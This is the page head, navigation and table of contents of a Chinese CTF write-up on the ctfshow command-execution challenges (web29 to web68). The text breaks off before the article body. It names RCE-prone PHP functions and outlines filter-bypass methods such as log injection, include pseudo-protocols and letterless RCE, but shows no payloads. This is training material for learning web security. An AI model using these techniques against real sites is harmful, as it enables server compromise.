<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x01基础知识专门写了一个关于RCE和文件包含的总结，所以这里的知识点就删减掉了 2.函数1.对于PHP，以下是一些可能存在RCE漏洞的函数： PHP的system()和exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。 PHP的eval()函数：该函数用于执行字符串作为PHP代码，如果未对用户输入进行适当的过滤或验证，攻击者可">
<meta property="og:type" content="article">
<meta property="og:title" content="web入门命令执行篇-ctfshow">
<meta property="og:url" content="https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="0x01基础知识专门写了一个关于RCE和文件包含的总结，所以这里的知识点就删减掉了 2.函数1.对于PHP，以下是一些可能存在RCE漏洞的函数： PHP的system()和exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。 PHP的eval()函数：该函数用于执行字符串作为PHP代码，如果未对用户输入进行适当的过滤或验证，攻击者可">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202221351137.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223226048-1733149950287-7.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223505176.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223753099.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223810603.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223826336.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202224028444.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112243907.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112712388.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112906751.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113345873.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113618790.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113808719.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203114948954.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115011171.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115023290.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115242537.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115319047.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115353682.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115417447.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115459175.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115532705.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115552580.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115605412.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115627179.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115650126.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115825635.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115953670.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729867285696-8ef1f841-4da9-4137-9fe6-893735bb43a5.webp">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930351348-50661fd2-280a-40ee-9b87-e304bceceb02.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930528011-c8cc956f-2e2d-45f0-9afd-b64644576961.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930831607-9a87b068-075d-4221-89c7-adac1f189207.webp">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729939289573-10e3b495-d4a3-4352-bc6a-0273394c441d.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729944668855-0fe90f7c-dd74-4ee4-839b-e4cf8b1b5dda.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950081135-53bb1560-59bd-49e8-97fe-99ff9ac5d903.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950239757-90e70843-021d-4099-b21d-a8f4acb3d3d4.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950731355-ef566b34-560f-4f25-9071-6b68a5f98500.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729951980194-9294209a-ac98-459a-85da-447bbaf62f7c.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729997334358-8ae6bb16-2dc7-4263-980c-1008b43c8bbf.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729998377034-05e78540-dc5c-420b-8134-b9eca1e5b3b1.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317154006777.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317164620779.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317165809692.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317184857147.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317190451957-1742209493627-7.png">
<meta property="article:published_time" content="2025-03-17T11:10:51.000Z">
<meta property="article:modified_time" content="2025-05-16T03:44:23.757Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="命令执行">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202221351137.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>web入门命令执行篇-ctfshow</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/03/18/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/13/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&text=web入门命令执行篇-ctfshow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&is_video=false&description=web入门命令执行篇-ctfshow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web入门命令执行篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&name=web入门命令执行篇-ctfshow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&t=web入门命令执行篇-ctfshow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">2.函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">3.远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">2.1.</span> <span class="toc-text">web29</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87flag"><span class="toc-number">2.1.1.</span> <span class="toc-text">#绕过flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">preg_match ()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.2.</span> <span class="toc-text">web30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87system"><span class="toc-number">2.2.1.</span> <span class="toc-text">#绕过system</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">2.3.</span> <span class="toc-text">web31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87cat%E5%92%8Cphp"><span class="toc-number">2.3.1.</span> <span class="toc-text">#绕过cat和php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">2.4.</span> <span class="toc-text">web32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%A6%E5%8F%82%E6%95%B0%E8%BE%93%E5%85%A5"><span class="toc-number">2.4.1.</span> <span class="toc-text">1.带参数输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.日志注入:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">2.5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">2.6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">2.7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">2.8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">2.9.</span> <span class="toc-text">web37</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%8C%85%E5%90%AB"><span class="toc-number">2.9.1.</span> <span class="toc-text">#include包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.2.</span> <span class="toc-text">include函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">2.10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">2.11.</span> <span class="toc-text">web39</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%8C%85%E5%90%AB-php"><span class="toc-number">2.11.1.</span> <span class="toc-text">#include包含.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-c-%E2%80%9D-php%E2%80%9D"><span class="toc-number">2.11.2.</span> <span class="toc-text">include($c.”.php”);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">2.12.</span> <span class="toc-text">web40</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">2.12.1.</span> <span class="toc-text">#无参数rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">2.13.</span> <span class="toc-text">web41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">2.13.1.</span> <span class="toc-text">#或运算</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">2.14.</span> <span class="toc-text">web42</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%A2%E5%BC%83%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.14.1.</span> <span class="toc-text">#重定向丢弃的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E9%80%9A%E9%81%93%E7%AC%A6"><span class="toc-number">2.14.2.</span> <span class="toc-text">知识点:通道符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.14.3.</span> <span class="toc-text">知识点:重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">2.15.</span> <span class="toc-text">web43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.15.1.</span> <span class="toc-text">#过滤+重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">2.16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">2.17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">2.18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wbe47"><span class="toc-number">2.19.</span> <span class="toc-text">wbe47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">2.20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">2.21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">2.22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">2.23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">2.24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">2.25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">2.26.</span> <span class="toc-text">web54</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-uniq"><span class="toc-number">2.26.1.</span> <span class="toc-text">知识点:uniq</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-grep%E7%9A%84%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.26.2.</span> <span class="toc-text">知识点:grep的常用选项与示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">2.27.</span> <span class="toc-text">web55</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Drce"><span class="toc-number">2.27.1.</span> <span class="toc-text">#无字母rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">2.28.</span> <span class="toc-text">web56</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRce"><span class="toc-number">2.28.1.</span> <span class="toc-text">#无数字字母Rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.28.2.</span> <span class="toc-text">解题思路:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">2.29.</span> <span class="toc-text">web57</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%88%A9%E7%94%A8linux%E7%9A%84-%E6%9E%84%E9%80%A0%E5%87%BA36"><span class="toc-number">2.29.1.</span> <span class="toc-text">解题思路:利用linux的$(())构造出36</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58-65"><span class="toc-number">2.30.</span> <span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-number">2.31.</span> <span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="toc-number">2.32.</span> <span class="toc-text">两种解法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#highlight-file%E5%87%BD%E6%95%B0%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.32.1.</span> <span class="toc-text">highlight_file函数查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.32.2.</span> <span class="toc-text">include+伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96"><span class="toc-number">2.32.3.</span> <span class="toc-text">无参数读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-source-%E5%87%BD%E6%95%B0"><span class="toc-number">2.32.4.</span> <span class="toc-text">show_source()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web66"><span class="toc-number">3.</span> <span class="toc-text">web66</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">scandir()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readdir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.2.</span> <span class="toc-text">readdir()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opendir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.3.</span> <span class="toc-text">opendir()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web67"><span class="toc-number">4.</span> <span class="toc-text">web67</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#print-r-%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">print_r()函数替换函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#var-dump"><span class="toc-number">4.1.1.</span> <span class="toc-text">var_dump()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#var-export"><span class="toc-number">4.1.2.</span> <span class="toc-text">var_export()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web68"><span class="toc-number">5.</span> <span class="toc-text">web68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readgzfile-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.1.</span> <span class="toc-text">readgzfile()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.2.</span> <span 